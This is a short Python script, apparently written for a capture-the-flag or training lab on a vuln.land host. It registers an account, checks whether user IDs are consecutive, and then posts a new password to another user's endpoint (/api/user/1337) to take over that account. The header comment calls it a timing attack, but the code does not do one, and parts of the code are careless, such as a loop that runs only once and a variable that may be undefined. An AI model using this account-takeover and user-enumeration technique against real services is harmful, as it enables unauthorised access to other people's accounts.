# try a timing based attack on the path finder

from urllib.error import HTTPError, URLError
from urllib.request import urlopen, Request

def createUsers(base_url):
    import requests
    for i in range(1,2):
        if i%100 == 0:
            print(f"{i}")
        with requests.Session() as session:
            post_dict = {'username': f'{i}', 'password': f'{i}'}
            response = session.post(f'{base_url}api/register', json=post_dict)
            if response.status_code == 200:
                response = session.get(f"{base_url}/api/user/me")
                last = response.json()
                post_dict = {'password': 'foo'}
                response = session.post(f'{base_url}api/user/1337', json=post_dict)
                return response
                                        # print(f'{last["id"]} ', end='')
            else:
                print(response.status_code)
                print(f'not consecutive id detected -- {i} missing')
                print(f'last good response {last}')
                return last


if __name__ == "__main__":
    base_url = "https://fc3842ae-d20d-465a-aff2-bdb555002b13.idocker.vuln.land/"
    response = createUsers(base_url)
    print(response)